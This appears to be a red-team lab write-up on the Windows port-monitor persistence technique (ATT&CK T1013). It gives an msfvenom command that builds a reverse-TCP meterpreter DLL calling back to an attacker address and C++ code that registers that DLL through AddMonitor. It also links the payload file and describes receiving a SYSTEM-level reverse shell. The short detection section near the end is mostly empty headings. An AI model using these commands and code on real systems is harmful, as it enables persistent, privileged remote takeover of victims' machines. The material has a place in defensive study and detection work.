# T1013: AddMonitor\(\)

## Execution

Generating a 64-bit meterpreter payload to be injected into the spoolsv.exe as part of the technique - see bottom of the page for more info about the technique's high-lever overview:

{% code-tabs %}
{% code-tabs-item title="attacker@local" %}
```text
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil64.dll
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Writing and compiling a simple C++ code that will register the monitor port:

{% code-tabs %}
{% code-tabs-item title="monitor.cpp" %}
```cpp
#include "stdafx.h"
#include "Windows.h"

int main() {	
	MONITOR_INFO_2 monitorInfo;
	TCHAR env[12] = TEXT("Windows x64");
	TCHAR name[12] = TEXT("evilMonitor");
	TCHAR dll[12] = TEXT("evil64.dll");
	monitorInfo.pName = name;
	monitorInfo.pEnvironment = env;
	monitorInfo.pDLLName = dll;
	AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
	return 0;
}
```
{% endcode-tabs-item %}
{% endcode-tabs %}

{% file src="../.gitbook/assets/t1013-portmonitor64.exe" caption="PortMonitor64" %}

{% file src="../.gitbook/assets/evil64.dll" caption="evil64.dll - meterpreter payload" %}

Move evil64.dll to %systemroot% and execute the compiled `monitor.cpp`.

## Observations

Upon launching the compiled executable and inspecting the victim machine with procmon, we can see that the evil64.dll is being accessed:

![](../.gitbook/assets/monitor-loaddll2.png)

which spawns a rundll32 process \(meterpreter payload\) which initiates a connection back to the attacker:

The attacker receives a reverse meterpreter session as **SYSTEM**:

The below shows the procmon results explained above:

Sysmon commandline arguments and network connection logging to the rescue:
